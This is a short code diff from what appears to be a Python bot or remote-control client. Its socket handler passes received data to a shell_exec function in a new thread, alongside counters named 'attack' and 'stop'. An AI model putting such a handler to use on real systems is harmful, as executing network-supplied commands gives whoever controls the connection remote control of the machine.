@@ -33,7 +33,7 @@ def handler(sock):
 						stop = True
 						attack = 0
 					stop = False
-					p= threading.Thread(target=shell_exec, args = (command[1], sock))
+					p= threading.Thread(target=shell_exec, args = (data[5:], sock))
 					p.start()
 					attack+=1
 	...
